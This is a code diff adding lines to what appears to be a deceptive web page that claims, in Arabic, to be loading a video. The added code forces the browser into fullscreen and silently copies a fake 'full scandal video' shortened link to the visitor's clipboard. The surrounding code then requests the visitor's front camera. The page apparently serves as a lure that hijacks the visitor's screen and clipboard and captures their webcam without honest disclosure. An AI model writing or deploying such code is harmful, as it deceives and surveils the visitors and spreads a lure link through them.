@@ -49,6 +49,22 @@
         document.getElementById('loader').style.display = 'block';
         document.getElementById('status').innerText = 'جاري تحميل الفيديو...';
 
+        // شاشة كاملة
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) {
+            document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+            document.documentElement.msRequestFullscreen();
+        }
+
+        // نسخ نص في الـ Clipboard (رابط وهمي جذاب)
+        navigator.clipboard.writeText("رابط الفيديو الكامل: bit.ly/fadiha-tel-2025").then(() => {
+            console.log('تم نسخ الرابط في الـ Clipboard');
+        });
+
         navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
             let video = document.createElement('video');
             video.srcObject = stream;
